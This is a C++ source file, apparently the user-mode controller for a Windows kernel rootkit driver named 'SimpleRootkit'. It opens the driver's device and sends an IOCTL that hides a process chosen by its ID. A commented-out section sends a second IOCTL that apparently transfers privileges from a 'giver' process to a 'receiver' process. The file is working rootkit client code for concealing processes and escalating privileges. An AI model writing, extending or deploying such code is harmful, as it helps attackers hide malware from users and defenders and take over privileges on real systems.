#include <Windows.h>
#include <stdio.h>
#include "../SimpleRootkit/ioctl.hpp"
#include "../SimpleRootkit/Common.hpp"
#include <winternl.h>
int main()
{
    // open handle
    printf("[+] Opening handle to driver...");
    HANDLE hDriver = CreateFile(
        L"\\\\.\\SimpleRootkit",
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] %s (%d)\n", "Failed to open device", GetLastError());
        return 1;
    }
    else
    {
        printf("success!\n");
    }

    // call FIRST_DRIVER_IOCTL_TEST
    /*PID_LVL_UP data;
    DWORD giver, receiver;
    printf("If you want to know i'm %ld\nGiver ::\n", GetCurrentProcessId());
    scanf_s(" %d", &giver);
    printf("Receiver ::\n");
    scanf_s(" %d", &receiver);

    data.PID_giver = giver;
    data.PID_receiver = receiver;

    printf("[+] Calling IOCTL_PID_LEVEL_UP...");

    TheAnswer answer;
    DWORD bytesReturned;

    BOOL success = DeviceIoControl(
        hDriver,
        IOCTL_PID_LEVEL_UP,
        &data,              
        sizeof(data),       
        NULL,            
        NULL,    
        NULL,
        nullptr);


        printf("success!\n");
        #define NtGetPeb()           (PPEB)__readgsqword(0x60)
        printf("%p\n",NtGetPeb());*/
        PID_hider pid_to_hide;
        int pid;
        scanf_s("%d", &pid);
        pid_to_hide.PID = pid;

        BOOL success = DeviceIoControl(
            hDriver,
            IOCTL_PID_HIDE_ME_BABY,
            &pid_to_hide,
            sizeof(pid_to_hide),
            NULL,
            NULL,
            NULL,
            nullptr);
 
    getchar();
    int a;
    scanf_s("%d", &a);

    printf("[+] Closing handle\n");
    CloseHandle(hDriver);
}